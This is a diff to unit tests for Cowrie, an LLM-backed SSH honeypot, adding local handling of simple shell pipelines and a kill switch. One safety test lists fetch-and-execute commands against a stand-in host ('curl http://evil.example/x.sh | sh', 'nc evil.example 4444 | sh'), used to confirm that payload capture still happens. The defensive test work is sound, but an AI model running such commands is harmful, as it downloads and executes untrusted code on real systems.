@@ -13,6 +13,7 @@ from __future__ import annotations
 
 from twisted.trial import unittest
 
+from cowrie.llm import pipefilters
 from cowrie.llm import responder as R
 from cowrie.llm.persona import pick_persona, roll_boot_time
 from cowrie.llm.worldstate import WorldState
@@ -40,8 +41,10 @@ class TestDefer(unittest.TestCase):
         self.assertIsNone(R.respond("", _ctx()))
         self.assertIsNone(R.respond("   ", _ctx()))
 
-    def test_pipeline_defers(self):
-        self.assertIsNone(R.respond("cat /etc/passwd | grep root", _ctx()))
+    def test_pipeline_with_an_unmodelled_filter_defers(self):
+        # Simple pipelines are handled now (see TestPipes); anything whose
+        # filter stage we do not model still goes to the LLM.
+        self.assertIsNone(R.respond("cat /etc/passwd | awk '{print $1}'", _ctx()))
 
     def test_redirect_defers(self):
         self.assertIsNone(R.respond("uname -a > /tmp/x", _ctx()))
@@ -514,8 +517,175 @@ class TestMisc(unittest.TestCase):
 
     def test_junk_input_never_raises(self):
         # respond() must be total — any garbage returns None, never raises.
-        for junk in ("\\\x00bad", "uname " + "-" * 5000, "cat " + "/" * 3000):
+        for junk in (
+            "\\\x00bad",
+            "uname " + "-" * 5000,
+            "cat " + "/" * 3000,
+            "| head",
+            "ps aux |",
+            "| | |",
+            "ps aux | head -n",
+            "ps aux | head -abc",
+            "ps aux | grep [",
+            "ps aux | " * 200,
+        ):
             try:
                 R.respond(junk, _ctx())
             except Exception as e:  # pragma: no cover
                 self.fail(f"respond raised on {junk!r}: {e}")
+
+
+class TestPipes(unittest.TestCase):
+    """Simple pipelines stay local instead of falling through to the LLM.
+
+    Measured motivation: 19% of the commands reaching the LLM across the
+    attacker_sim corpus were piped forms of commands the emulator already
+    answers — including two of the three repeat probes in FINGERPRINT_PROBE,
+    the adversary written to catch the honeypot contradicting itself. Those
+    were being routed to the component least able to stay consistent.
+    """
+
+    # -- the safety invariant, first because it is the one that would hurt --
+
+    def test_download_pipelines_still_reach_the_interceptor(self):
+        """`curl http://evil/x.sh | sh` must NOT be handled here.
+
+        _try_deterministic runs before _try_download_intercept, so a
+        pipeline we "handled" locally would silently lose the payload
+        capture. The protecting rule is that stage 0 must resolve through
+        _DISPATCH — curl and wget are not in it — and there is deliberately
+        no filter-only fast path.
+        """
+        for cmd in (
+            "curl http://evil.example/x.sh | sh",
+            "wget -qO- http://evil.example/x | sh",
+            "curl -s http://evil.example/a | bash",
+            "nc evil.example 4444 | sh",
+        ):
+            self.assertIsNone(R.respond(cmd, _ctx()), cmd)
+
+    def test_other_shell_operators_still_defer(self):
+        for cmd in (
+            "cd /tmp || cd /var",
+            "cd /tmp && wget http://x",
+            "echo a; echo b",
+            "uname -a > /tmp/x",
+            "echo $(whoami)",
+        ):
+            self.assertIsNone(R.respond(cmd, _ctx()), cmd)
+
+    def test_malformed_pipelines_defer(self):
+        for cmd in ("ps aux |", "| head", "ps aux | | wc -l"):
+            self.assertIsNone(R.respond(cmd, _ctx()), cmd)
+
+    # -- equivalence: piped output == the filter applied to unpiped output --
+
+    def test_piped_matches_filtering_the_unpiped_output(self):
+        ctx = _ctx()
+        for base, stage in (
+            ("free -m", "head -2"),
+            ("cat /etc/os-release", "head -3"),
+            ("ps aux", "grep root"),
+            ("cat /proc/cpuinfo", "grep -m1 'model name'"),
+        ):
+            unpiped = R.respond(base, ctx)
+            self.assertIsNotNone(unpiped, base)
+            expected = pipefilters.apply_filter(unpiped.output, stage)
+            piped = R.respond(f"{base} | {stage}", ctx)
+            self.assertIsNotNone(piped, f"{base} | {stage}")
+            self.assertEqual(piped.output, expected, f"{base} | {stage}")
+
+    def test_the_six_measured_commands_are_handled(self):
+        ctx = _ctx()
+        for cmd in (
+            "free -m | head -2",
+            "cat /etc/os-release | head -3",
+            "cat /proc/cpuinfo | grep -m1 'model name'",
+            "ps aux | grep root",
+            "ps auxf | head",
+            "ls -la /tmp | wc -l",
+        ):
+            self.assertIsNotNone(R.respond(cmd, ctx), cmd)
+
+    def test_multi_stage_pipeline(self):
+        out = R.respond("ps aux | grep root | wc -l", _ctx())
+        self.assertIsNotNone(out)
+        self.assertTrue(out.output.strip().isdigit())
+
+    # -- ls is piped-aware --------------------------------------------------
+
+    def test_ls_counts_entries_when_piped_not_one(self):
+        """Real ls drops its column layout when stdout is not a tty.
+
+        Left alone this would report 1 for any `ls | wc -l` — removing one
+        fingerprint while creating another.
+        """
+        ctx = _ctx()
+        listing = R.respond("ls /etc", ctx).output
+        entries = len(listing.split())
+        counted = R.respond("ls /etc | wc -l", ctx).output.strip()
+        self.assertEqual(int(counted), entries)
+        self.assertGreater(entries, 1)
+
+    def test_ls_stays_columnar_when_not_piped(self):
+        self.assertNotIn("\n", R.respond("ls /etc", _ctx()).output.rstrip("\n"))
+
+    def test_ls_long_form_pipes_cleanly(self):
+        out = R.respond("ls -la /etc | grep hosts", _ctx())
+        self.assertIsNotNone(out)
+        self.assertIn("hosts", out.output)
+
+    # -- contracts ----------------------------------------------------------
+
+    def test_no_match_is_handled_with_empty_output_not_deferred(self):
+        """"" means handled-with-no-output; None means ask the LLM. A
+        grep that matches nothing is the former."""
+        out = R.respond("ps aux | grep zzz-no-such-process", _ctx())
+        self.assertIsNotNone(out)
+        self.assertEqual(out.output, "")
+
+    def test_error_output_defers_rather_than_being_filtered(self):
+        """`cat /nope` prints to stderr on a real box, which never
+        traverses the pipe — so grepping it locally would be wrong."""
+        self.assertIsNone(R.respond("cat /nonexistent | grep x", _ctx()))
+        self.assertIsNone(R.respond("stat /nonexistent | grep Size", _ctx()))
+
+    def test_unmodelled_filter_defers_whole_pipeline(self):
+        for cmd in (
+            "ps aux | awk '{print $1}'",
+            "ps aux | sort",
+            "ps aux | head -c 5",
+            "ps aux | grep -E 'a|b'",
+        ):
+            self.assertIsNone(R.respond(cmd, _ctx()), cmd)
+
+    def test_piped_output_is_stable_across_identical_calls(self):
+        ctx = _ctx()
+        self.assertEqual(
+            R.respond("free -m | head -2", ctx).output,
+            R.respond("free -m | head -2", ctx).output,
+        )
+
+
+class TestPipeKillSwitch(unittest.TestCase):
+    def test_disabling_pipe_filters_restores_the_old_behaviour(self):
+        """`[llm] pipe_filters = false` must defer every pipeline again,
+        so an operator can back the feature out without a downgrade."""
+        from cowrie.core.config import CowrieConfig
+
+        if not CowrieConfig.has_section("llm"):
+            CowrieConfig.add_section("llm")
+        original = CowrieConfig.get("llm", "pipe_filters", fallback=None)
+        CowrieConfig.set("llm", "pipe_filters", "false")
+        try:
+            self.assertIsNone(R.respond("free -m | head -2", _ctx()))
+            # Unpiped commands are unaffected.
+            self.assertIsNotNone(R.respond("free -m", _ctx()))
+        finally:
+            if original is None:
+                CowrieConfig.remove_option("llm", "pipe_filters")
+            else:
+                CowrieConfig.set("llm", "pipe_filters", original)
+
+    def test_enabled_by_default(self):
+        self.assertIsNotNone(R.respond("free -m | head -2", _ctx()))
